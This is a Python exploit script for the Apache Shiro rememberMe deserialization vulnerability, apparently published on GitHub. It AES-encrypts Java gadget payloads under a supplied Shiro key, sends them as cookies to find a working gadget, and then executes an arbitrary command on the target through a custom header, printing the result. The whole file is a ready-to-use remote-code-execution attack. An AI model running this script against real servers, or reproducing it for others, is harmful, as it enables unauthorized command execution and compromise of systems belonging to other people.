#coding:utf-8
import sys
import base64
import uuid
from Crypto.Cipher import AES
import requests,re,random

gadget_list=['CommonsBeanutils1','CommonsBeanutils2','CommonsCollectionsK1','CommonsCollectionsK2','Jdk7u21','Jdk8u20']
source = ['a', 'b', 'c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']

""" 生成cookie """
def encode_rememberme(key,gadget):
	with open('./gadget/'+gadget+'.class','rb+') as f:
		ysopayload=f.read()
	BS   = AES.block_size    # 16
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	mode =  AES.MODE_CBC 
	iv = uuid.uuid4().bytes
	encryptor = AES.new(base64.b64decode(key), mode, iv)
	file_body = pad(ysopayload)
	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
	return base64_ciphertext

""" 枚举可用gadget """
def find_gadget(url,key):
	for gadget in gadget_list:
		random_key = ''.join(random.sample(source, 5))
		cookie_payload = encode_rememberme(key,gadget)
		headers={
			"Cookie":"rememberMe={}".format(cookie_payload),
			"Testecho":random_key,
		}
		res = requests.get(url,headers=headers)
		#print(res.headers)
		try:
			if res.headers['Testecho'] == random_key:
				print("[+] find support gadget: {}".format(gadget))
				return gadget
				#break
		except:
			print("[-] not support gadget: {}".format(gadget))

""" 攻击函数 """
def attack():
	if len(sys.argv)!=4:
		print('usage: python {} targetUrl shiroKey command\ne.g.:python shiro_rememberMe_rce.py http://192.168.0.106:8080/login kPH+bIxk5D2deZiIxcaaaA== id\nGitHub:https://github.com/admintony/').format(sys.argv[0])
		return
	support_gadget = find_gadget(sys.argv[1],sys.argv[2])
	print("[+] start execute command")
	cookie_payload = encode_rememberme(sys.argv[2],support_gadget)
	headers={
		"Cookie":"rememberMe={}".format(cookie_payload),
		"Testcmd":sys.argv[3]+" && echo command-result-end"
	}
	res = requests.get(sys.argv[1],headers=headers)
	#print(res.text)
	re_obj = re.compile(r'((?:.|\n)*)command-result-end')
	result = re_obj.findall(res.text)
	if len(result)!=0:
		print("[+] command execute result:")
		print(result[0])
	else:
		print("[+] 可能不存在漏洞，请人工查验")
	
attack()
#find_gadget(sys.argv[1],sys.argv[2])